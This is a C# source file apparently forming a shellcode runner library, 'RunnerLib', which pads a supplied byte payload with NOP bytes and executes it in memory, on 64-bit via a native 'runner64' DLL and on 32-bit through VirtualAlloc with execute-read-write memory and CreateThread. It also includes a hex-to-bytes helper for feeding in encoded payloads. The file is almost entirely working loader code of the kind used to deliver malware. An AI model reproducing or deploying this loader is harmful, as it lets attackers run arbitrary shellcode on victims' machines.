using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Runtime.InteropServices;

namespace RunnerLib
{
    public class Run
    {

        [DllImport("runner64")]
        private static extern void RunShellcode(IntPtr shellcode, Int64 size);

        public static void Execute(Byte[] payload)
        { 
             UInt32 size = 4096; //Minimum allocation size

            if (payload.Length > size)
            {
                size = (UInt32) payload.Length;
            }

            byte[] shellcode = new byte[size];

            for (Int32 i = 0; i<shellcode.Length; i++)
            {
                shellcode[i] = 0x90;
            }

            Array.Copy(payload, 0, shellcode, 0, payload.Length);

            Int32 aSize = 0;
            unsafe
            {
                aSize = sizeof(IntPtr); // 4 on x86 bit machines. 8 on x64
            }

            if (aSize == 8)
            {

                unsafe
                {
                    char* pointerToChars = stackalloc char[(Int32)size];
                    
                    IntPtr pointer = new IntPtr(pointerToChars);
                    Marshal.Copy(shellcode, 0, pointer, shellcode.Length);

                    RunShellcode(pointer, (Int64)size);
                }

            }
            else
            {

                //Array.Copy(exitFunc, 0, shellcode, payload.Length, exitFunc.Length);

                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                UInt32 hThread = 0;
                UInt32 threadId = 0;
                // prepare data

                UInt32 pinfo = 0;

                // execute native code

                try
                {

                    hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                }
                catch { }
            }
        }


        public static List<Byte> StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16)).ToList<Byte>();
        }



        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);

        [DllImport("kernel32")]
        private static extern UInt32 CreateThread(

        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        UInt32 param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId

        );

        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

        UInt32 hHandle,
        UInt32 dwMilliseconds
        );

        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(

        string moduleName

        );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(

        IntPtr hModule,
        string procName

        );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(

        string lpFileName

        );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();

        public enum ProcessorArchitecture
        {
            X86 = 0,
            X64 = 9,
            @Arm = -1,
            Itanium = 6,
            Unknown = 0xFFFF,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SystemInfo
        {
            public ProcessorArchitecture ProcessorArchitecture; // WORD
            public uint PageSize; // DWORD
            public IntPtr MinimumApplicationAddress; // (long)void*
            public IntPtr MaximumApplicationAddress; // (long)void*
            public IntPtr ActiveProcessorMask; // DWORD*
            public uint NumberOfProcessors; // DWORD (WTF)
            public uint ProcessorType; // DWORD
            public uint AllocationGranularity; // DWORD
            public ushort ProcessorLevel; // WORD
            public ushort ProcessorRevision; // WORD
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct SYSTEM_INFO_UNION
        {
            [FieldOffset(0)]
            public UInt32 OemId;
            [FieldOffset(0)]
            public UInt16 ProcessorArchitecture;
            [FieldOffset(2)]
            public UInt16 Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct SYSTEM_INFO
        {
            public SYSTEM_INFO_UNION CpuInfo;
            public UInt32 PageSize;
            public UInt32 MinimumApplicationAddress;
            public UInt32 MaximumApplicationAddress;
            public UInt32 ActiveProcessorMask;
            public UInt32 NumberOfProcessors;
            public UInt32 ProcessorType;
            public UInt32 AllocationGranularity;
            public UInt16 ProcessorLevel;
            public UInt16 ProcessorRevision;
        }

        [DllImport("kernel32.dll", SetLastError = false)]
        public static extern void GetSystemInfo(out SYSTEM_INFO Info);
    }
}
